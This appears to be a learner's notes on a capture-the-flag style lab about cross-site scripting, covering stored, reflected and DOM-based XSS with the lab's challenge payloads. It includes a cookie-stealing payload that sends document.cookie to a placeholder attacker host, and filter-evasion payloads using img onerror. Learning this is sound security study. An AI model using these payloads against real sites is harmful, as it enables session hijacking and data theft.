# Introduction                            

Cross-site scripting (XSS) is a security vulnerability typically  found in web applications. Its a type of injection which can allow an  attacker to execute malicious scripts and have it execute on a victims  machine.

A web application is vulnerable to XSS if it uses  unsanitized user input. XSS is possible in Javascript, VBScript, Flash  and CSS.

The extent to the severity of this vulnerability depends  on the type of XSS, which is normally split into two categories:  persistent/stored and reflected. Depending on which, the following  attacks are possible:

-  Cookie Stealing - Stealing your cookie from an authenticated session, allowing an attacker to login as you without themselves having to provide authentication.

  

-  Keylogging - An attacker can register a keyboard event listener and send all of your keystrokes to their own server.

  

-  Webcam snapshot - Using HTML5 capabilities its possible to even take snapshots from a compromised computer webcam.

  

-  Phishing - An attacker could either insert fake login forms into the page, or  have you redirected to a clone of a site tricking you into revealing  your sensitive data.

  

-  Port Scanning - You read that correctly. You can use stored XSS to scan an  internal network and identify other hosts on their network.

  

-  Other browser based exploits - There are millions of possibilities with XSS.

Who knew this was all possible by just visiting a web-page. There are  measures put in place to prevent this from happening by your browser and anti-virus.

This room will explain the different types of cross-Site scripting, attacks and require you to solve challenges along the way.

# Stored XSS                            

Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often  happens when a website allows user input that is not sanitised (remove  the "bad parts" of a users input) when inserted into the database. 

**An example**

![img](https://i.imgur.com/LCSFUTB.png)

A **attacker** creates a payload in a field when signing up to a website that is stored in the websites database. If the website doesn't properly sanitise that field, when the site displays that field on the page, it will execute the payload to everyone who visits it. 

- **The payload could be as simple as** `<script>alert(1)</script>`

However, this payload wont just execute in your browser but any other browsers that display the malicious data inserted into the database.

Lets experiment exploiting this type of XSS. navigate to the "Stored-XSS" page on the XSS playground.

![image-20220404233231829](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220404233231829.png)

- **Alert popup box with your document cookies** `<script>alert(document.cookie)</script>`

- **Adding comments and using Java script** `<script>document.getElementById('thm-title').textContent="I am a hacker";</script>`

-  To steal a victims cookie `<script>document.location='http://<ip>/log/'+document.cookie</script>`

#  Reflected XSS                            

In a reflected cross-site scripting attack, the malicious payload is part  of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.

This might seem harmless as it requires the victim to send a request  containing an attackers payload, and a user wouldn't attack themselves.  However, attackers could trick the user into clicking their crafted link that contains their payload via social-engineering them via email..

Reflected XSS is the most common type of XSS attack.

**An example**

![img](https://i.imgur.com/yX7zRh8.png)

An attacker crafts a URL containing a malicious payload and sends it to  the victim. The victim is tricked by the attacker into clicking the URL. The request could be `http://example.com/search?keyword=<script>...</script>` 

The website then includes this malicious payload from the request in the  response to the user. The victims browser will execute the payload  inside the response. The data the script gathered is then sent back to  the attacker (it might not necessarily be sent from the victim, but to  another website where the attacker then gathers this data - this  protects the attacker from directly receiving the victims data).

- Craft a reflected XSS payload that will cause a popup `http://<ip>/reflected?keyword=<script>alert(“Hello”)</script>`

- Craft a reflected XSS payload that will cause a popup with your machines IP address.

   `http://<ip>/reflected?keyword=<script>alert(window.location.hostname)</script>`

#  DOM-Based XSS                            

<details open=""><summary>What is the DOM</summary><p>DOM stands for <b>D</b>ocument <b>O</b>bject <b>M</b><span>odel and is a programming interface for HTML and <a class="droD1sz6 glossary-term" onclick="initPopOver('XML', 'droD1sz6')">XML</a>
 documents. It represents the page so that programs can change the 
document structure, style and content. A web page is a document and this
 document can be either displayed in the browser window or as the HTML 
source. A diagram of the HTML DOM is displayed below:</span></p><p><img src="https://www.w3schools.com/js/pic_htmltree.gif" style="width:486px;float:none;"></p><p><span style="font-size:1rem;">With the object mode, Javascript gets all the power it needs to create dynamic HTML. More information can be found on <a href="https://www.w3schools.com/js/js_htmldom.asp">w3schools</a> website.</span><br></p></details>



In a DOM-based XSS attack, a malicious payload is not actually parsed by  the victim's browser until the website's legitimate JavaScript is  executed. So what does this mean?

With **reflective** xss, an  attackers payload will be injected directly on the website and will not  matter when other Javascript on the site gets loaded.

```xss
<html>
    You searched for <em><script>...</script></em>
</html 
```

With **DOM-Based** xss, an attackers payload will only be executed when the vulnerable Javascript code is either loaded or interacted with. It goes through a Javascript function like so:

```xss
var keyword = document.querySelector('#search')
keyword.innerHTML = <script>...</script>
```

-  Executing an alert with your cookies `<script>test" onmouseover="alert(document.cookie)"</script>`

- Create an *onhover* event on an image tag, that change the background color of the website to red.

​       `test" onmouseover="document.body.style.backgroundColor = 'red';`

#  Filter Evasion                            

**1 Bypass the filter that removes any script tags.**

```
<img src="x" onerror="alert('Hello')">
```

**2 The word alert is filtered, bypass it.**

```
<img src="x" onerror="prompt('Hello')">
```

**3 The word hello is filtered, bypass it.**

```
<img src="x" onerror="alert('HHelloello')">
```

